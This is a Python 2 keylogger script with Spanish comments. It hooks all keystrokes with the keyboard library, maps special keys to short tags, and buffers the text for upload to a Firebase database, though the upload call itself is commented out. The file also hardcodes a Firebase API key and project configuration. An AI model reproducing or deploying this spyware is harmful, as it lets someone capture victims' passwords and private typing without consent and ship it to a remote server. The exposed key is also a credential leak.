
from functools import partial 
import os
import keyboard

# Importando Firebase Librerias
import pyrebase
import firebase_admin
from firebase_admin import credentials
from firebase_admin import db
 
config = {
    "apiKey": "AIzaSyABQ0wcIzMCxhvCYkAZgeRDS5xVsSIMHfQ",
    "authDomain": "isuscribe-9959a.firebaseapp.com",
    "databaseURL": "https://isuscribe-9959a.firebaseio.com",
    "projectId": "isuscribe-9959a",
    "storageBucket": "isuscribe-9959a.appspot.com",
    "messagingSenderId": "378149954801"
} 
firebase = pyrebase.initialize_app(config)
db = firebase.database()

data=''

MAP = {
    "space": " ",
    "\r": "\n"
} 

# Ubicación y nombre del archivo que guarda las teclas presionadas.
FILE_NAME = "keys.txt"
# Determina si el archivo de salida es limpiado cada vez que se
# inicia el programa.
CLEAR_ON_STARTUP = False
# Tecla para terminar el programa o None para no utilizar ninguna tecla.
TERMINATE_KEY = "esc"

def callback(output, is_down, event):
    if event.event_type in ("up", "down"):
        global data
        key = MAP.get(event.name, event.name)
        modifier = len(key) > 1
        # Capturar únicamente los modificadores cuando están siendo
        # presionados.
        if not modifier and event.event_type == "down":
            return
        # Evitar escribir múltiples veces la misma tecla si está
        # siendo presionada.
        if modifier:
            if event.event_type == "down":
                if is_down.get(key, False):
                    return
                else:
                    is_down[key] = True
            elif event.event_type == "up":
                is_down[key] = False
            # Indicar si está siendo presionado.
            if key == 'backspace':
                key = '<'
            elif key == 'windows izquierda':
                key = 'w_l'
            elif key == 'windows derecha':
                key = 'w_r'
            elif key ==  'mayusculas':
                key = 'mayus'
            elif key ==  'flecha derecha':
                key = 'f_r'
            elif key ==  'flecha izquierda':
                key = 'f_l'
            elif key ==  'flecha arriba':
                key = 'f_t'
            elif key ==  'flecha abajo':
                key = 'f_b'
            

            print key
            key = "[{}]".format(key)
            
        elif key == "\r":
            # Salto de línea.
            key = "\n"
            # data = data + key 
        data = data + key
        
        # print len(data)
        if len(data)> 100:

            #Estamos subiendo al servidor
            # save = {"contenido": data }
            # result = db.child("prueba").push(save)
            data = ''
            print "Subiendo"
            # print save
 
        
 
def main():
    # Borrar el archivo previo.
    if CLEAR_ON_STARTUP:
        os.remove(FILE_NAME)
    
    # Indica si una tecla está siendo presionada.
    is_down = {}
    
    # Archivo de salida.
    output = open(FILE_NAME, "a")
    
    # Cerrar el archivo al terminar el programa.
    # atexit.register(onexit, output)
    
    # Instalar el registrador de teclas.
    keyboard.hook(partial(callback, output, is_down))
    keyboard.wait(TERMINATE_KEY)


if __name__ == "__main__":
    main()